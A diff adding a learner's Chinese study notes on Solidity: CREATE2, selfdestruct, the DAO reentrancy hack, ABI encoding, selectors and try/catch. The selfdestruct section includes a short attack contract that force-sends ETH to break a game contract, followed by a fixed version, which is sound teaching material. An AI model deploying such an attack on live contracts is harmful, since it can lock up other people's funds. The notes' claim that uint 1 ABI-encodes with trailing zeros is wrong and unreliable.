@@ -938,4 +938,288 @@ Contract x = new Contract{value: _value}(params);
 
 这种天生的分布式让我想起的Erlang的进程设计, 创建的进程也是默认分布式的, 但是相比之下，智能合约更强大。
 
+### 2024.10.06
+#### 25 Create2
+
+`Create2` 对比 `create` 最大的变化或者说是优点就是地址可以是固定的，因为计算地址的四个参数都是确定的，所以生成出来的地址自然就是确定的, 而 `create` 用的创建者的地址 + nonce (该地址发送的交易总数) 来生成新地址, nonce 会随时间变化而变化, 地址就可能发生变化.
+
+除了文中提到的优点外，`create2` 还有一些额外的优点，我觉得比较有用的就是：
+
+##### 支持重新部署合约
+
+上文提到，`create` 创建的合约地址与 nonce 相关，那么在删除合约后，重新部署合约，合约地址就有可用发生改变。而如果使用 `create2`, 只要使用相同的部署者地址，相同的 salt 和相同的 initcode, 就能保证部署后的合约地址不变，那么合约的删除与重新部署对于客户来说就是无感的.
+
+##### 节省 Gas 
+
+在某些情况下，CREATE2 可以通过允许在部署前对合约地址进行操作来节省 Gas 费用。例如，用户可以将资金发送到尚未部署的合约地址，而后在需要时部署该合约。这样可以避免不必要的多次部署或地址查找操作。
+
+理论虽然可行，但是往没有部署的合约打钱，难免会虚的.
+
+
+##### 不足
+凡事有利就有弊， `create2` 也不例外，如果不同的合约使用相同的 `salt` 和 `initcode`, 且由同一个地址部署，那么就会出现地址冲突的问题，所以需要确保 `salt` 的唯一.
+
+### 2024.10.07
+#### 26 Delete Contract
+
+`selfdestruct` 是用来删除合约，如果从Web2的视角来理解，创建合约就相当将代码部署上线，而删除合约就相当于是将代码下线，正常业务肯定是希望业务7x24小时运行，100%可用的，需要将网站下线的情况一般都比较极端，比如遭受攻击，例如曾经的索尼，或者是提桶跑路。
+
+DAO 指的是Decentralized Autonomous Organization，去中心化的投资资金, 而课程中的提到的The DAO攻击原理就是我在笔记中提到的重入攻击:
+1. 用户可以在DAO提现，正常情况下，用户想要提现，那么就会向指定合约打钱，然后合约再更新余额
+2. 而重入攻击就是黑客调用提现功能，在合约更新余额前再递归调用，就可以在一次交易中实现多次提现，以耗尽DAO的钱.
+
+而2016年那次攻击，黑客通过重入攻击转走了当时价值3.6 M的资金，但是被盗资金因为DAO的机制，需要先被锁定28天，就给了Ethereum 基金会反应的时间，当时有3个选项：
+1. 啥都不干
+2. Soft Fork: 修改代码，冻结被盗奖金
+3. Hark Fork: 将区块链回滚到被盗前的状态
+
+最后基金会选择了选项3，回滚。
+
+这个决定引发了极大的争议，也导致了社区的分裂，毕竟区块链标榜的就是不可窜改，现在创始人带头回滚改状态，相当于与设计初衷相背了, Ethereum 就分裂成 Ethereum(ETH) 和 Ethereum(ETC)
+
+言归正传, `selfdestruct` 就可以理解成一键清空余额并删库的操作，现在 `Remix` 都给出编译警告了:
+
+```
+Warning: "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
+  --> contracts/DeleteContract.sol:10:9:
+   |
+10 |         selfdestruct(payable(msg.sender));
+   |         ^^^^^^^^^^^^
+```
+
+而 `selfdestruct(_addr)` 中的 `_addr` 是接收合约中剩余 `ETH` 的地址， `_addr` 地址不需要有 `receive` 或 `fallback` 也能接收 `ETH`（这个就种coinbase 地址一样了）, 也就是没有拒收的余地.
+
+利用这个自毁并且强制转账的功能, 也可以实现某种攻击手段.
+
+例如有这么个游戏，每次只能转入1个ETH，当你是第7个转入者，合约余额累计到7ETH的时候，你就可以把钱给领走:
+
+```
+contract EtherGame {
+    uint256 public targetAmount = 7 ether;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        uint256 balance = address(this).balance;
+        require(balance <= targetAmount, "Game is over");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent,) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+```
+
+上面的代码作了限制，如果转入的金额不是1ETH，转出就会失败，最后比较余额是否等于7，但是作为攻击者，就可以利用 `selfdestruct` 的强制转账的机制，可以直接把游戏给搞挂：
+
+```solidity
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
+```
+
+假如我合约余额是 0.00000324 ETH, 强制转账就能绕过 `require(msg.value==1)` 的限制，那么这个游戏就永远不会有赢家，因为它每次只能转入1ETH，没法实现 `balance==targetAmount`, 除非你用类似的攻击手段，再转入个 `0.99999676`, 湊够 1ETH.
+
+更进一步，这里的预防手段是不要依赖 `address(this).blanace`, 而是要用自定义的变量:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract EtherGame {
+    uint256 public targetAmount = 3 ether;
+    uint256 public balance;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        balance += msg.value;
+        require(balance <= targetAmount, "Game is over");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent,) = msg.sender.call{value: balance}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+```
+
+### 2024.10.08
+
+#### ABI encode/decode
+在理解ABI 编码之前，首先要了解什么ABI.
+
+在其他编程语言的语境下（主要是C），ABI(Application Binary Interface)指的是应用程序或操作系统中的二进制接口，定义了不同程序模块（例如函数，库，操作系统内核用户究竟程序）在编译后的二进制是如何交互的, 包括函数调用方式，参数传递方式，返回值的处理，系统调用，内存布局等等。
+
+而智能合约的ABI(Application Binary Interface), 是智能合约在以太坊等区块链网络中与外部应用程序(类如其他合约或前端应用)通信的标准.
+
+例如有这样的ABI 部署在地址 `0xC1666a11E5Ac3feAE09388f31AEff1ac014f9900`:
+
+```py
+erc_20_abi = [
+    {
+        "constant": False,
+        "inputs": [
+            {
+                "name": "_to",
+                "type": "address"
+            },
+            {
+                "name": "_value",
+                "type": "uint256"
+            }
+        ],
+        "name": "transfer",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "type": "function"
+    }
+]
+```
+
+就可以通过Python 脚本来调用这个合约，完成Web2与Web3的交互.
+```py
+w3 = Web3()
+my_contract = w3.eth.contract(address=0xC1666a11E5Ac3feAE09388f31AEff1ac014f9900, abi=erc_20_abi)
+my_contract.functions.transfer(_to=other_account.address,_value=420202020).call()
+```
+
+而所谓的ABI编码就是把数据编码成十六进制(或者二进制, 其实都可以), 例如 0x7a58c0be72be218b41c608b7fe7c5bb630736c71000000, 编码的方式多种多样, 比如有数据 `uint a = 1`, `string b = "string"`, 你可以把它们都转换成对应的十六进制，然后拼接起来
+
+`a = 1` 的十六进制就是 `0x1`, 但是uint是uint256, 是256位长度的, 换成十六进制, 就是有64位长, 补0之后变成: `0x1000000000000000000000000000000000000000000000000000000000000000`
+
+所以 `abi.encode` 就是补0版本的, 而 `abi.encodePacked` 就是不补0版本的, 可以直观看到 `abi.encode` 更耗费存储空间，但是如果是合约相互调用, 你使用 `abi.encodePacked` 来编码，使用`abi.decode` 解码就会报错，因为decode uint256, 它就是按照256个bit 来解码的，但是你说应该只取一个1bit,那么它就解不出正确的数值了.
+
+而`abi.encodeWithSignature()` 就是配合 `call` 使用的, 其实参数类型 `abi.encode` 和 `abi.encodePacked` 都可以通过传入参数推断出来，而 `abi.encodeWithSignature` 特别之处在于它还传入了调用的函数名.
+
+`abi.encodeWithSelector` 与 `abi.encodeWithSignature`功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节
+
+```
+function encodeWithSelector() public view returns(bytes memory result) {
+    result = abi.encodeWithSelector(bytes4(keccak256("foo(uint256,address,string,uint256[2])")), x, addr, name, array);
+}
+```
+但是任何哈希相关的操作，尤其是截取部分hash的情况，都需要注意可能会出现的哈希冲突，我没有深挖到 `keccak256` 的实现原理，但是如果有两个函数生成的hash 如下:
+
+0x5467872....
+0x5467087....
+
+他们的前4个字节就是一样的，当然这个只是存在理论冲突的可能，总不能无限地创建函数.
+
+abi解码就是把对应的十六进制/二进制数据翻译成原来正常的参数，因为标准的解码就是按照参数类型解码，你是`uint256`, 就把256个bit 转换成数字， 所以就只有一种解码方式.
+
+#### Hash
+
+Hash 这个概念在编程中就非常常见了，在Java和C++中就有不同的Hash函数实现，而整个区块链技术都可以说是在构建在 hash function 之上的。
+
+所谓的区块链，不同之间的区块(block) 就是通过每个区块自身的 hash 以及记录前一个区块的 hash 串连起来，成为「链」的。
+
+生成钱包地址，交易的唯一标识，这些都和 hash function 息息相关。谈起好的 hash function, 最关键的是它是否能尽量降低 hash 碰撞的函数，即两个不同的参数，生成了相同的 hash 值。
+
+不过按照已知技术（2024）年，想要碰撞出相同值的 hash 也是非常难的.
+
+另外一个关于 keccak hash function 的趣事是, keccak hash function 是赢得了美国国家标准与技术研究院(National Institute of Standards and Technology)的 hash function 大赛，然后被选为SHA3的标准.
+
+### 2024.10.09
+#### Selector
+
+要理解什么是 selector, 就要先了解 `method_id` 与函数签名。
+
+所谓的函数签名，是指函数的名称和参数类型的组合，用来唯一标识一个函数，不包含返回类型。例如有函数：
+
+```
+function transfer(address recipient, uint256 amount) public returns (bool)
+```
+
+那么它的函数签名就是 `transfer(address,uint256)`，而 `method id` 就是函数签名的 keccak256 hash 之后的前4个字节, 如 `transfer` 函数的 `method id` 就是: 
+
+```
+bytes4(keccak256("transfer(address,uint256)"))
+```
+
+当我们调用智能合约时，本质是向目标合约发送一段 `calldata`, 发送的 `calldata` 的前4个字节就是 `selector`，当 `selector` 和 `method id` 相匹配时，即表示调用对应的函数.
+
+讲 abi encode/decode 的时候提到的第4个函数就是， `abi.encodeWithSelector`，知道目标合约函数的 `selector` 和地址，就可以直接调用目标函数了.
+
+```
+address targetAddress = ''
+targetAddress.call(abi.encodeWithSelector(0x3ec37834, 1, 0));
+```
+
+所谓知其然知其所以然，为什么Solidity会使用 `selector` 和 `method id` 这样的机制呢，而不是像C++那样搞编译期解析呢？
+
+追根溯源，还是要回到EVM的Blockchain架构上，使用 `selector`和 `method id`比直接使用函数签约最大的好处就是可以节省 gas fee. 
+
+因为无法预测开发者可能会给一个函数定义多长的名字，或者定义多少个参数，如果传递函数签名的话，那么gas fee就会随着函数名的变长或者参数数量的变多而线性增加。
+
+使用 `method_id` 就能把函数签名的结果固定在4个字节，既可以节省gas，也避免了gas fee会随函数签名的长度增加而增加.
+
+#### Try/Catch
+
+说起 try/catch, 也不是所有的现代语言都会有，像 Rust/Golang 都选择了不使用 `try/catch`, 一个是判断返回值，一个是处理 `Result`。
+
+我在前面讲异常处理的笔记中，也预先提到了 `try/catch` 的内容.
+
+在 Solidity 中， `try/catch` 只能被用于 `external` 函数或创建合约时的 `constructor`(被视为 `external` 函数调用)
+
+```solidity
+try externalContract.f() {
+    // call成功的情况下 运行一些代码
+} catch {
+    // call失败的情况下 运行一些代码
+}
+```
+
+如果调用的函数有返回值，那么必须在try之后声明 `returns(returnType val)，`并且在try模块中可以使用返回的变量（这个时候, 命名式返回就派上用场了）；如果是创建合约，那么返回值是新创建的合约变量。
+
+
+```solidity
+try externalContract.f() returns(returnType){
+    // call成功的情况下 运行一些代码
+} catch Error(string memory /*reason*/) {
+    // 捕获revert("reasonString") 和 require(false, "reasonString")
+} catch Panic(uint /*errorCode*/) {
+    // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界
+} catch (bytes memory /*lowLevelData*/) {
+    // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支
+    // 例如revert() require(false) revert自定义类型的error
+}
+```
+
+如果想要确保能 `catch` 到异常， `catch` 最后的分支要不是 `catch (bytes memory)`, 要不是 `catch {}`
+
+问题就来了，为什么只支持 `external` function呢? 个人猜测是因为:
+
+external 调用不确定性更高，可能出来 gas 不够，或者是其他异常，所以需要引入 try/catch 来作异常处理。而对于合约内的调用，因为 Solidity 的异常模型是 `state-revert` exception, 所以当内部调用出现问题了(`require` 或者 `assert`)，状态就自动回滚了，无须 `try/catch` 处理
+
+WTF Solidity 102 is done, I should pat myself on the back for completing this project.
 <!-- Content_END -->
